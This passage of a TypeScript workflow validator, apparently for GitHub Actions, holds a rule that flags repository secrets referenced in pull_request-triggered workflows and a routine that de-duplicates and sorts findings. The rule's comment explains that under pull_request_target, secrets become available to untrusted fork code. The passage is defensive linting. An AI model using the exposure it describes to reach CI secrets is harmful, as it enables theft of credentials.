    }
  }
}

/* (f) ─ secrets.* used in pull_request-triggered workflows (INFO) ─────────────
 *
 * `pull_request` from a fork does NOT expose repository secrets by default
 * (a safety measure), so referencing `secrets.*` in such a workflow either does
 * nothing useful for forks or — if it’s actually `pull_request_target` — runs
 * with secrets against untrusted code. Flag as info so the author confirms intent.
 */
function checkSecretsInPullRequest(
  prTriggered: boolean,
  lines: string[],
  add: (f: Finding) => void,
): void {
  if (!prTriggered) return;
  const line = findLine(lines, (l) => /\$\{\{\s*secrets\./i.test(l));
  if (line !== undefined) {
    add({
      id: 'secrets-in-pull-request',
      severity: 'info',
      title: 'Secrets referenced in a pull_request-triggered workflow.',
      detail:
        'Workflows triggered by `pull_request` from a fork do not receive repository secrets by default. If this runs as `pull_request_target`, the secrets ARE available to untrusted PR code — make sure that is intended.',
      line,
      remediation:
        'Confirm whether forks need these secrets. Prefer running secret-dependent steps on a trusted event (push, workflow_run) rather than untrusted PRs.',
    });
  }
}

/* ────────────────────────────────────────────────────────────────────────── *
 *  Finalize — sort by severity, de-duplicate, and roll up counts.
 * ────────────────────────────────────────────────────────────────────────── */

const SEVERITY_ORDER: Record<Severity, number> = { error: 0, warning: 1, info: 2 };

function finalize(findings: Finding[]): ValidateResult {
  // De-duplicate identical findings that two passes might both emit. The TITLE
  // is part of the key: distinct problems can legitimately share a rule id and
  // a line (or an unresolved line), and collapsing them hid real findings.
  const seen = new Set<string>();
  const deduped: Finding[] = [];
  for (const f of findings) {
    const key = `${f.id}@${f.line ?? '-'}@${f.title}`;
    if (seen.has(key)) continue;
    seen.add(key);
    deduped.push(f);
  }

  // Stable sort: severity first, then by line number (undefined lines last).
  deduped.sort((a, b) => {
    const s = SEVERITY_ORDER[a.severity] - SEVERITY_ORDER[b.severity];
    if (s !== 0) return s;
    const al = a.line ?? Number.MAX_SAFE_INTEGER;
    const bl = b.line ?? Number.MAX_SAFE_INTEGER;
    return al - bl;
  });

  const summary = {
    errors: deduped.filter((f) => f.severity === 'error').length,
    warnings: deduped.filter((f) => f.severity === 'warning').length,
    infos: deduped.filter((f) => f.severity === 'info').length,
  };

  return { ok: true, findings: deduped, summary };
}
